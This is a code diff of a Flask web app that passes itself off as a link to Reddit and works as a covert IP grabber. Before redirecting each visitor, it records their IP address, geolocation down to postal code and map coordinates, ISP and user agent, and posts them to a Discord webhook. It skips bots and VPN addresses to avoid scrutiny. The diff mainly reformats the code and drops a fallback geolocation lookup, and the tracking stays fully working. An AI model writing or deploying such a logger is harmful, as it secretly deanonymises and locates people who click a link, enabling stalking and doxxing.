@@ -17,7 +17,10 @@ logged_ips_today = set()
 
 # ===================== FUNCTIONS =====================
 def get_real_ip():
-    for header in ["X-Forwarded-For","CF-Connecting-IP","X-Real-IP"]:
+    """Get the visitor's real public IP."""
+    # Common headers from proxies / CDNs
+    headers_to_check = ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]
+    for header in headers_to_check:
         ip = request.headers.get(header)
         if ip:
             return ip.split(",")[0].strip()
@@ -31,85 +34,107 @@ def is_cloud_ip(org):
     return any(cloud.lower() in org.lower() for cloud in CLOUD_PROVIDERS)
 
 def get_visitor_info(ip, user_agent):
+    """Query IPAPI for accurate location and map link."""
     details = {}
-    fallback_used = False
     try:
         r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-        if r.status_code==200:
+        if r.status_code == 200:
             details = r.json()
-        if not details.get("city"):
-            r2 = requests.get(f"https://ipwhois.app/json/{ip}", timeout=5)
-            if r2.status_code==200:
-                details = r2.json()
-                fallback_used=True
     except:
         pass
-    city = details.get("city","Unknown")
-    region = details.get("region","Unknown")
-    country = details.get("country_name","Unknown")
-    postal = details.get("postal","Unknown")
+
+    city = details.get("city", "Unknown")
+    region = details.get("region", "Unknown")
+    country = details.get("country_name", "Unknown")
+    postal = details.get("postal", "Unknown")
     lat = details.get("latitude") or details.get("lat")
     lon = details.get("longitude") or details.get("lon")
-    if lat is None or lon is None:
-        map_url = f"https://www.google.com/maps/search/{city}+{region}+{country}"
-    else:
-        map_url = f"https://www.google.com/maps?q={lat},{lon}"
     org = details.get("org") or details.get("asn_org") or "Unknown ISP"
     vpn_detected = is_cloud_ip(org)
-    return {"ip":ip,"user_agent":user_agent,"city":city,"region":region,"country":country,"postal":postal,"lat":lat,"lon":lon,"org":org,"vpn":vpn_detected,"fallback_used":fallback_used,"map_url":map_url,"date":datetime.utcnow().strftime("%d/%m/%Y"),"time":datetime.utcnow().strftime("%H:%M:%S")}
 
-def send_to_discord(info,retries=3,delay=2):
+    # Google Maps link
+    if lat is not None and lon is not None:
+        map_url = f"https://www.google.com/maps?q={lat},{lon}"
+    else:
+        map_url = f"https://www.google.com/maps/search/{city}+{region}+{country}"
+
+    return {
+        "ip": ip,
+        "user_agent": user_agent,
+        "city": city,
+        "region": region,
+        "country": country,
+        "postal": postal,
+        "lat": lat,
+        "lon": lon,
+        "org": org,
+        "vpn": vpn_detected,
+        "map_url": map_url,
+        "date": datetime.utcnow().strftime("%d/%m/%Y"),
+        "time": datetime.utcnow().strftime("%H:%M:%S")
+    }
+
+def send_to_discord(info, retries=3, delay=2):
     vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
-    fallback_text = " (Fallback API)" if info['fallback_used'] else ""
     embed_color = 16711680 if info['vpn'] else 7506394
+
     payload = {
-        "username":"🌍 Visitor Tracker",
-        "embeds":[
+        "username": "🌍 Visitor Tracker",
+        "embeds": [
             {
-                "title":f"🚶 New Visitor from {info['country']}{fallback_text}",
-                "color":embed_color,
-                "fields":[
-                    {"name":"🖥️ IP Address","value":f"`{info['ip']}`","inline":False},
-                    {"name":"📍 Location","value":f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['postal']}","inline":False},
-                    {"name":"🏢 ISP / Organization","value":info['org'],"inline":False},
-                    {"name":"📱 Device Info","value":f"`{info['user_agent']}`","inline":False},
-                    {"name":"🌍 Google Maps","value":f"[Open Map]({info['map_url']})","inline":False},
-                    {"name":"🛡️ VPN / Proxy Detected","value":vpn_text,"inline":False}
+                "title": f"🚶 New Visitor from {info['city']}, {info['region']}",
+                "color": embed_color,
+                "fields": [
+                    {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
+                    {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['postal']}", "inline": False},
+                    {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
+                    {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
+                    {"name": "🌍 Google Maps", "value": f"[Open Map]({info['map_url']})", "inline": False},
+                    {"name": "🛡️ VPN / Proxy Detected", "value": vpn_text, "inline": False}
                 ],
-                "footer":{"text":f"Logged at {info['date']} {info['time']} GMT"}
+                "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
             }
         ]
     }
-    for attempt in range(1,retries+1):
+
+    for attempt in range(retries):
         try:
-            resp = requests.post(DISCORD_WEBHOOK_URL,json=payload,timeout=5)
-            if 200<=resp.status_code<300: break
-        except: pass
-        if attempt<retries: time.sleep(delay)
+            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+            if 200 <= resp.status_code < 300:
+                break
+        except:
+            pass
+        time.sleep(delay)
 
 # ===================== ROUTES =====================
 @app.route('/')
 def index():
     ip = get_real_ip()
-    user_agent = request.headers.get("User-Agent","Unknown")
+    user_agent = request.headers.get("User-Agent", "Unknown")
+
     if is_bot(user_agent):
         return redirect(REDDIT_URL)
-    visitor_info = get_visitor_info(ip,user_agent)
+
+    visitor_info = get_visitor_info(ip, user_agent)
+
     if visitor_info['vpn']:
         return redirect(REDDIT_URL)
+
     if ip in logged_ips_today:
         return redirect(REDDIT_URL)
+
     logged_ips_today.add(ip)
     send_to_discord(visitor_info)
+
     return redirect(REDDIT_URL)
 
 # ===================== DAILY RESET =====================
 def clear_logged_ips():
     global logged_ips_today
-    logged_ips_today=set()
-    threading.Timer(86400,clear_logged_ips).start()
+    logged_ips_today = set()
+    threading.Timer(86400, clear_logged_ips).start()
 
 clear_logged_ips()
 
-if __name__=="__main__":
-    app.run(host="0.0.0.0",port=10000,debug=False)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000, debug=False)
